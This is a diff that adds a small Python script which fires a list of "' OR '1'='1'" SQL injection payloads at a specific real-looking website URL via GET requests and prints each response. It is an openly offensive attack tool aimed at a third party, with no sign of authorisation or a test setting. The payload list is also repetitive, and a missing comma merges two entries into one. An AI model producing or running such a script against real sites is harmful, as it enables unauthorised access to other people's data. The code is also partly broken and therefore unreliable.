@@ -1,0 +1,37 @@
+import requests
+
+def sql_injection_attack():
+    # URL vulnerable to SQL injection
+    url = "https://www.web.cm/index.php/en/?id=7"
+
+    # Payloads for SQL injection
+    payloads = [
+        "' OR '1'='1'--",
+        "' OR '1'='1'/*",
+        "' OR '1'='1'--+",
+        "' OR '1'='1' #",
+        "' OR '1'='1'/*",
+        "' OR '1'='1'--+",
+        "' OR '1'='1' /*",
+        "' OR '1'='1'--'",
+        "' OR '1'='1'--\""
+        "' OR '1'='1'/*",
+        "' OR '1'='1'--+",
+        "' OR '1'='1' /*",
+        "' OR '1'='1'--'",
+        "' OR '1'='1'--\"",
+        "' OR '1'='1' /*",
+        "' OR '1'='1'--+",
+        "' OR '1'='1' /*",
+        "' OR '1'='1'--'",
+        "' OR '1'='1'--\"",
+        "' OR '1'='1' /*",
+    ]
+
+    # Send GET requests with payloads
+    for payload in payloads:
+        response = requests.get(url + payload)
+        print(response.text)
+
+if __name__ == "__main__":
+    sql_injection_attack()
